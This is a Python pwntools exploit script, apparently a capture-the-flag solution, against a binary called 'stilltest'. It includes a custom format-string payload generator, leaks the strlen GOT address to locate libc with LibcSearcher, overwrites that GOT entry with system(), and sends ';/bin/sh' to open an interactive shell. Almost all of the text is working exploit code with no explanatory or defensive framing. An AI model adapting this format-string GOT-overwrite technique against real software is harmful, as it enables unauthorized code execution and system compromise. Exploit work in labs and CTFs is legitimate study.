#-*- coding:utf-8 –*-
from pwn import *
import time
from LibcSearcher import LibcSearcher
#context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
Debug = 1
if Debug:
    io = process("./stilltest")
else:
    io = remote('0.0.0.0',10003)

def antitone_fmt_payload(offset, writes, numbwritten=0, write_size='byte'):
	config = {
		32 : {
			'byte': (4, 1, 0xFF, 'hh', 8),
			'short': (2, 2, 0xFFFF, 'h', 16),
			'int': (1, 4, 0xFFFFFFFF, '', 32)},
		64 : {
			'byte': (8, 1, 0xFF, 'hh', 8),
			'short': (4, 2, 0xFFFF, 'h', 16),
			'int': (2, 4, 0xFFFFFFFF, '', 32)
		}
	}

	if write_size not in ['byte', 'short', 'int']:
		log.error("write_size must be 'byte', 'short' or 'int'")

	number, step, mask, formatz, decalage = config[context.bits][write_size]

	payload = ""

	payload_last = ""
	for where,what in writes.items():
		for i in range(0,number*step,step):
			payload_last += pack(where+i)

	fmtCount = 0
	payload_forward = ""
	
	key_toadd = []
	key_offset_fmtCount = []


	for where,what in writes.items():
		for i in range(0,number):
			current = what & mask
			if numbwritten & mask <= current:
				to_add = current - (numbwritten & mask)
			else:
				to_add = (current | (mask+1)) - (numbwritten & mask)

			if to_add != 0:
				key_toadd.append(to_add)
				payload_forward += "%{}c".format(to_add)
			else:
				key_toadd.append(to_add)
			payload_forward += "%{}${}n".format(offset + fmtCount, formatz)
			key_offset_fmtCount.append(offset + fmtCount)
			#key_formatz.append(formatz)

			numbwritten += to_add
			what >>= decalage
			fmtCount += 1

	
	len1 = len(payload_forward)

	key_temp = []
	for i in range(len(key_offset_fmtCount)):
		key_temp.append(key_offset_fmtCount[i])

	x_add = 0
	y_add = 0
	while True:
		
		x_add = len1 / 8 + 1
		y_add = 8 - (len1 % 8)
		
		for i in range(len(key_temp)):
			key_temp[i] = key_offset_fmtCount[i] + x_add
		
		payload_temp = ""
		for i in range(0,number):
			if key_toadd[i] != 0:
				payload_temp += "%{}c".format(key_toadd[i])
			payload_temp += "%{}${}n".format(key_temp[i], formatz)

		len2 = len(payload_temp)

		xchange = y_add - (len2 - len1)
		if xchange >= 0:
			payload = payload_temp + xchange*'a' + payload_last
			return payload;
		else:
			len1 = len2
#dump bin can not be loaded
#but can analysis
offset = 8
#step 1 leak the printf_got
#maybe plt 08048400
strlen_got = 0x601020
strlen_leak = "%9$s" + "SEND" + p64(strlen_got)
io.send(strlen_leak)
io.recvuntil('Repeater:')
libc_strlen = u64(io.recvuntil('SEND', drop=True).ljust(8, '\x00'))
print hex(libc_strlen)
#libc_printf = u64(io.recv()[8:16])
#print hex(libc_printf)
io.recv()

#step 2 find the libc
libc = LibcSearcher('strlen',libc_strlen)
libcbase = libc_strlen - libc.dump('strlen')
system_addr = libcbase + libc.dump('system')
print hex(system_addr)
#step 3 cover the address

payload_antitone = antitone_fmt_payload(8,{strlen_got : system_addr},write_size='short',numbwritten=9)
#payload_cover = fmtstr_payload(8,{putchar_got : system_addr},write_size='short')
io.sendline(payload_antitone)
io.recv()

#step 4 get shell
#time.sleep(10)
io.sendline(";/bin/sh\x00")
#io.recv()
print hex(system_addr)
io.interactive()